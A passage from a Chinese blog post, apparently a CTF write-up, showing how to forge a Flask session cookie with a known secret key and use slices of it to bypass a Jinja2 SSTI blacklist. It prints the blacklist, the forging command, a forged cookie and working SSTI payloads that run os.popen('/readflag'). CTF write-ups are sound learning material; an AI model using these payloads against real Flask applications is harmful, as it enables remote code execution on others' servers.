+<p>然后我们就可以进行session伪造了，但是由于等会需要进行ssti(但是过滤了很多)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<br><span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,<br><span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>,<br><span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+<p>这里有两种写法：</p>
+<p>法一：（字符串拼接）不推荐，很难拼</p>
+<p>法二：</p>
+<p>这里session是可控的，所以我们可以把需要的字符串先存入session中，然后在ssti时从session中取值</p>
+<blockquote>
+<p><code>&#123;%print(session)%&#125;</code>这样可以把session的值打印出来</p>
+<p>我在这里学到了新的东西，jinja2的字符串可以进行字符串切片</p>
+<p>首先我们需要把<code>session</code>转为字符串，我们使用<code>string过滤器</code></p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">session</span>|string)[<span class="hljs-name">39:50</span>]<br></code></pre></td></tr></table></figure>
+
+<p>这样就可以打印出session中的一段值了</p>
+</blockquote>
+<p>首先使用脚本构造flask session：(这里我们把ssti需要使用的字符串也构造到session中了)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;bxdQy9DN6FiCBXhNZFm3YwAgJ+Mn4+mRFiI0sYEP*NeepuCTF*&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;/readflag&#x27;: 0, &#x27;__globals__&#x27;: 0, &#x27;admin&#x27;: 1, &#x27;os&#x27;: 0,&#x27;popen&#x27;: 0, &#x27;read&#x27;: 0&#125;&quot;</span><br><br>.eJyrVtIvSk1MSctJTFeyMtBRio9Pz8lPSswpjo8H8xNTcjPzlKwMdZTyi8ECBfkFqXlgFkgfkFELAMoaFFg.ZG5POw.jWk5AQmFaC172YwAbMbUXlICmm4<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/05/25/MoyJRDLIkpwg7ze.png" srcset="/img/loading.gif" lazyload alt="image-20230525025204438"></p>
+<p>如图，我们将session变量的值打印出来了，其中包含我们可以利用的字符串</p>
+<p>接下来我们只需要构造如下ssti即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(lipsum[&quot;__globals__&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;/readflag&quot;)[&quot;read&quot;]())%&#125;<br></code></pre></td></tr></table></figure>
+
+<p>结合session的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(lipsum[(session|string)[39:50]][(session|string)[69:71]][(session|string)[78:83]]((session|string)[23:32])[(session|string)[24:28]]())%&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/05/25/EZB1Te6imHUgFbu.png" srcset="/img/loading.gif" lazyload alt="image-20230525025419723"></p>
+<h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p>伪造pin码</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/proc%E7%9B%AE%E5%BD%95self%E4%B8%8B%E7%9A%84maps-mem/" class="print-no-link">#proc目录self下的maps&&mem</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>proc目录self下的maps&amp;&amp;mem</div>
+      <div>https://leekosss.github.io/2023/08/24/proc目录self下的maps&amp;&amp;mem/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/picoCTF2023/" title="picoCTF2023">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">picoCTF2023</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/php%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D(i,m,s,x,e)/" title="php正则匹配(i,m,s,x,e)">
+                        <span class="hidden-mobile">php正则匹配(i,m,s,x,e)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
